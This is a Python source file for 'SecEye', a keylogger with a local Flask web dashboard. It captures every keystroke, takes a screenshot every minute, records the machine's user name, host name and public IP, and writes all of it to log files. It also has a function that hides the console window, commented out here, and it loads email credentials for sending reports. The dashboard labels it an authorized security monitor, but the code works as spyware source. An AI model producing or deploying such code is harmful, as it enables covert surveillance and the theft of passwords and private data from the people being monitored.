import warnings
import threading
import time
import os
import sys
import json
import webbrowser
from datetime import datetime
from pynput import keyboard
import psutil
import requests
from PIL import ImageGrab
import platform
import socket
from flask import Flask, render_template_string, jsonify

warnings.filterwarnings('ignore')

# ========== CONFIGURATION ==========
try:
    import config
    EMAIL_ADDRESS = config.EMAIL_ADDRESS
    EMAIL_PASSWORD = config.EMAIL_PASSWORD
    RECEIVER_EMAIL = config.RECEIVER_EMAIL
    SCREENSHOT_INTERVAL = getattr(config, 'SCREENSHOT_INTERVAL', 60)
    EMAIL_INTERVAL = getattr(config, 'EMAIL_INTERVAL', 300)
    BUFFER_SIZE = getattr(config, 'BUFFER_SIZE', 100)
except ImportError:
    EMAIL_ADDRESS = "your_email@gmail.com"
    EMAIL_PASSWORD = "your_app_password"
    RECEIVER_EMAIL = "receiver_email@domain.com"
    SCREENSHOT_INTERVAL = 60
    EMAIL_INTERVAL = 300
    BUFFER_SIZE = 100

WEB_PORT = 5000

# ========== JSON LOG FILE ==========
JSON_LOG_FILE = "logs.json"

# ========== GLOBAL VARIABLES ==========
log_buffer = ""
key_count = 0
screenshots_queue = []
last_screenshot_time = time.time()
keylog_data = []
current_stats = {
    'cpu': 0,
    'ram': 0,
    'disk': 0,
    'total_keys': 0,
    'screenshot_count': 0
}

# ========== FLASK APP ==========
app = Flask(__name__)

# HTML Template
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>SecEye Dashboard</title>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="3">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        .header {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px 30px;
            margin-bottom: 20px;
            color: white;
        }
        .header h1 {
            font-size: 28px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .badge {
            background: #e94560;
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            display: inline-block;
            margin-top: 10px;
        }
        .status {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: #00ff00;
            animation: pulse 1s infinite;
            margin-right: 8px;
        }
        @keyframes pulse {
            0% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
            100% { opacity: 1; transform: scale(1); }
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 15px;
            padding: 20px;
            color: white;
            text-align: center;
        }
        .stat-number {
            font-size: 36px;
            font-weight: bold;
        }
        .stat-label {
            font-size: 12px;
            opacity: 0.8;
            margin-top: 5px;
        }
        .logs-container {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 20px;
        }
        .logs-header {
            color: white;
            margin-bottom: 15px;
        }
        .logs-content {
            background: #1e1e2e;
            border-radius: 12px;
            padding: 15px;
            height: 400px;
            overflow-y: auto;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            color: #cbd5e1;
        }
        .log-entry {
            padding: 5px 10px;
            border-bottom: 1px solid #334155;
            white-space: pre-wrap;
        }
        .log-time {
            color: #e94560;
            margin-right: 10px;
        }
        .footer {
            margin-top: 20px;
            text-align: center;
            color: #666;
            font-size: 11px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>
                <span class="status"></span>
                👁️ SecEye Security Monitor
            </h1>
            <p>Real-time endpoint monitoring dashboard | Authorized use only</p>
            <div class="badge">● Active Monitoring</div>
        </div>
        
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number">{{ stats.cpu }}%</div>
                <div class="stat-label">CPU Usage</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ stats.ram }}%</div>
                <div class="stat-label">RAM Usage</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ stats.disk }}%</div>
                <div class="stat-label">Disk Usage</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ stats.total_keys }}</div>
                <div class="stat-label">Keystrokes</div>
            </div>
            <div class="stat-card">
                <div class="stat-number">{{ stats.screenshot_count }}</div>
                <div class="stat-label">Screenshots</div>
            </div>
        </div>
        
        <div class="logs-container">
            <div class="logs-header">
                <h3>📝 Live Activity Log</h3>
            </div>
            <div class="logs-content">
                {% for log in logs %}
                <div class="log-entry">
                    <span class="log-time">{{ log.time }}</span>
                    <span class="log-text">{{ log.text }}</span>
                </div>
                {% endfor %}
            </div>
        </div>
        
        <div class="footer">
            <p>Auto-refreshes every 3 seconds | SecEye Security Monitoring Tool</p>
        </div>
    </div>
</body>
</html>
'''

@app.route('/')
def index():
    # Get logs from JSON file
    logs = []
    if os.path.exists(JSON_LOG_FILE):
        try:
            with open(JSON_LOG_FILE, 'r', encoding='utf-8') as f:
                data = json.load(f)
                for entry in data[-50:]:
                    time_str = entry.get('timestamp', '')[-8:] if 'timestamp' in entry else ''
                    if entry.get('type') == 'keystroke':
                        text = entry.get('text', '')[:100]
                    elif entry.get('type') == 'screenshot':
                        text = f"📸 Screenshot captured: {entry.get('file', '')}"
                    elif entry.get('type') == 'session_start':
                        text = f"🚀 Session started on {entry.get('computer', 'Unknown')}"
                    elif entry.get('type') == 'system_stats':
                        text = f"📊 System - CPU: {entry.get('cpu',0)}% | RAM: {entry.get('ram',0)}% | Disk: {entry.get('disk',0)}%"
                    else:
                        text = str(entry)
                    logs.append({'time': time_str, 'text': text})
        except:
            pass
    
    # Update stats
    current_stats['cpu'] = psutil.cpu_percent()
    current_stats['ram'] = psutil.virtual_memory().percent
    current_stats['disk'] = psutil.disk_usage('/').percent
    current_stats['total_keys'] = len(keylog_data)
    current_stats['screenshot_count'] = len(screenshots_queue)
    
    return render_template_string(HTML_TEMPLATE, stats=current_stats, logs=logs[::-1])

def start_web_server():
    """Start Flask web server"""
    webbrowser.open(f'http://127.0.0.1:{WEB_PORT}')
    app.run(host='127.0.0.1', port=WEB_PORT, debug=False, use_reloader=False)

# ========== JSON LOGGING ==========
def save_to_json(entry):
    try:
        existing = []
        if os.path.exists(JSON_LOG_FILE):
            with open(JSON_LOG_FILE, 'r', encoding='utf-8') as f:
                existing = json.load(f)
        existing.append(entry)
        if len(existing) > 500:
            existing = existing[-500:]
        with open(JSON_LOG_FILE, 'w', encoding='utf-8') as f:
            json.dump(existing, f, indent=2, ensure_ascii=False)
    except:
        pass

def create_json_session_start():
    entry = {
        "type": "session_start",
        "timestamp": datetime.now().isoformat(),
        "computer": os.environ.get('COMPUTERNAME', 'Unknown'),
        "user": os.environ.get('USERNAME', 'Unknown'),
        "public_ip": get_ip_addresses()['public'],
        "local_ip": get_ip_addresses()['local']
    }
    save_to_json(entry)

def create_json_keystroke(text):
    entry = {
        "type": "keystroke",
        "timestamp": datetime.now().isoformat(),
        "text": text,
        "length": len(text)
    }
    save_to_json(entry)

def create_json_screenshot(path):
    entry = {
        "type": "screenshot",
        "timestamp": datetime.now().isoformat(),
        "file": path,
        "size": os.path.getsize(path) if os.path.exists(path) else 0
    }
    save_to_json(entry)

def create_json_system_stats():
    sys_info = get_system_info()
    entry = {
        "type": "system_stats",
        "timestamp": datetime.now().isoformat(),
        "cpu": sys_info['cpu_percent'],
        "ram": sys_info['ram_percent'],
        "disk": sys_info['disk_usage']
    }
    save_to_json(entry)

# ========== FUNCTIONS ==========
def hide_console():
    if os.name == 'nt':
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        ctypes.windll.kernel32.FreeConsole()

def get_ip_addresses():
    ips = {'public': 'Unknown', 'local': 'Unknown'}
    try:
        response = requests.get('https://api.ipify.org', timeout=5)
        if response.status_code == 200:
            ips['public'] = response.text
    except:
        pass
    try:
        hostname = socket.gethostname()
        ips['local'] = socket.gethostbyname(hostname)
    except:
        pass
    return ips

def get_system_info():
    info = {
        'computer': os.environ.get('COMPUTERNAME', 'Unknown'),
        'username': os.environ.get('USERNAME', 'Unknown'),
        'os': platform.system() + " " + platform.release(),
        'architecture': platform.machine(),
        'cpu_percent': psutil.cpu_percent(interval=1),
        'ram_percent': psutil.virtual_memory().percent,
        'disk_usage': psutil.disk_usage('/').percent,
        'hostname': socket.gethostname()
    }
    return info

def take_screenshot():
    try:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = f"screenshot_{timestamp}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path, "PNG")
        create_json_screenshot(screenshot_path)
        return screenshot_path
    except:
        return None

def write_to_file(content):
    try:
        with open("key_logs.txt", "a", encoding="utf-8") as f:
            f.write(content)
            f.flush()
    except:
        pass

def add_to_log(char):
    global log_buffer, key_count
    log_buffer += char
    key_count += 1
    if key_count >= BUFFER_SIZE:
        flush_buffer()

def flush_buffer():
    global log_buffer, key_count
    if log_buffer:
        write_to_file(log_buffer)
        create_json_keystroke(log_buffer)
        keylog_data.append({'time': datetime.now(), 'text': log_buffer})
        log_buffer = ""
        key_count = 0

def read_all_logs():
    try:
        if os.path.exists("key_logs.txt"):
            with open("key_logs.txt", "r", encoding="utf-8") as f:
                return f.read()
    except:
        pass
    return ""

def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            add_to_log(key.char)
        elif key == keyboard.Key.space:
            add_to_log(' ')
        elif key == keyboard.Key.enter:
            add_to_log('\n')
            flush_buffer()
        elif key == keyboard.Key.backspace:
            add_to_log('[⌫]')
    except:
        pass

def on_release(key):
    pass

def collect_screenshots():
    global last_screenshot_time, screenshots_queue
    while True:
        time.sleep(1)
        current_time = time.time()
        if (current_time - last_screenshot_time) >= SCREENSHOT_INTERVAL:
            screenshot_path = take_screenshot()
            if screenshot_path:
                screenshots_queue.append(screenshot_path)
            last_screenshot_time = current_time

def periodic_flush():
    while True:
        time.sleep(10)
        flush_buffer()
        create_json_system_stats()

def write_timestamp():
    create_json_session_start()

def run_keylogger():
    write_timestamp()
    
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    
    threading.Thread(target=periodic_flush, daemon=True).start()
    threading.Thread(target=collect_screenshots, daemon=True).start()
    
    print("="*50)
    print("✅ SecEye is running!")
    print(f"   📸 Screenshot every {SCREENSHOT_INTERVAL} seconds")
    print(f"   📁 Log file: key_logs.txt")
    print(f"   📊 JSON log: {JSON_LOG_FILE}")
    print(f"   🌐 Web Dashboard: http://127.0.0.1:{WEB_PORT}")
    print("="*50)
    print("\nPress Ctrl+C to stop...\n")
    
    # Start web server (this will block)
    start_web_server()

if __name__ == "__main__":
    # Don't hide console for debugging
    # hide_console()  # Commented to see output
    run_keylogger()